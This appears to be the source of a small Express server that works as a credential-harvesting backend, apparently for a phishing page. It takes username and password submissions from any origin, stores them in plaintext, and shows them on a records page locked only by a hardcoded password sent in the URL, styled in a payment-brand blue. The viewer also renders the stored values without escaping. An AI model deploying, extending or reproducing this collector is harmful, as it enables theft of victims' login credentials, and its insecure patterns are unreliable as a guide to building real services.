const express = require('express');
const fs = require('fs');
const cors = require('cors');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

const PASSWORD = 'yourpassword'; // Change this to your preferred password
const RECORDS_FILE = 'records.json';

app.use(cors());
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

// Ensure records file exists
if (!fs.existsSync(RECORDS_FILE)) {
    fs.writeFileSync(RECORDS_FILE, JSON.stringify([]));
}

// Route to handle form submission
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing fields' });
    }

    const records = JSON.parse(fs.readFileSync(RECORDS_FILE));
    records.push({ id: Date.now(), username, password });
    fs.writeFileSync(RECORDS_FILE, JSON.stringify(records, null, 2));
    res.json({ success: true });
});

// HTML records viewer
app.get('/records', (req, res) => {
    const { pass } = req.query;
    if (pass !== PASSWORD) {
        return res.send('<h2 style="color: red; font-family: sans-serif;">Access Denied: Incorrect Password</h2>');
    }

    const records = JSON.parse(fs.readFileSync(RECORDS_FILE));
    let html = `
        <html>
        <head>
            <title>Records</title>
            <style>
                body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 20px; }
                h1 { color: #0070ba; }
                .record { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; box-shadow: 0 0 5px rgba(0,0,0,0.1); }
                button { background: #0070ba; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; }
            </style>
        </head>
        <body>
            <h1>Records</h1>
    `;

    records.forEach(r => {
        html += `
            <div class="record">
                <strong>Username:</strong> ${r.username}<br>
                <strong>Password:</strong> ${r.password}<br><br>
                <form method="POST" action="/delete?id=${r.id}&pass=${pass}" style="display:inline;">
                    <button type="submit">Delete</button>
                </form>
            </div>
        `;
    });

    html += `</body></html>`;
    res.send(html);
});

// Delete record
app.post('/delete', (req, res) => {
    const id = parseInt(req.query.id);
    const pass = req.query.pass;
    if (pass !== PASSWORD) return res.send('Unauthorized');

    let records = JSON.parse(fs.readFileSync(RECORDS_FILE));
    records = records.filter(r => r.id !== id);
    fs.writeFileSync(RECORDS_FILE, JSON.stringify(records, null, 2));
    res.redirect('/records?pass=' + pass);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
